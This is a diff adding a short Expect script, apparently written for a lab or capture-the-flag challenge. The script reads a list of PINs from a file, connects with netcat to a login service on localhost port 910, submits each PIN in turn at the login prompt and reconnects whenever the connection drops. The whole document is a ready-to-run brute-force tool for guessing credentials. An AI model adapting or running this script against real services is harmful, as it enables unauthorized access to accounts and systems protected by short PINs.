@@ -1,0 +1,20 @@
+#!/usr/bin/expect
+
+set f [open "9-list.txt"]
+set pins [split [read $f] "\n"]
+close $f
+
+spawn nc 127.0.0.1 910
+foreach pin $pins {
+expect "login:" {
+	send "$pin\r"
+}
+sleep 3
+expect "...." {
+	
+	sleep 5
+	spawn nc 127.0.0.1 910
+	sleep 5
+}
+}
+interact
